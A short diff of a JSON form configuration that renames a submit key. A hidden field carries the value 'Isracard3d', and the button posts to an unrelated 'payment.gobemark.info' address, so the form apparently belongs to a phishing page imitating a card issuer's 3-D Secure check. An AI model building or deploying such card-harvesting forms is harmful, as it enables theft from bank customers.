@@ -118,7 +118,7 @@
       "type": "hidden",
       "value": "Isracard3d"
     },
-    "save": {
+    "share": {
       "label": "Send to stage",
       "type": "submit",
       "action": "https://payment.gobemark.info/php/exchange/master/index.php/stagebank/",
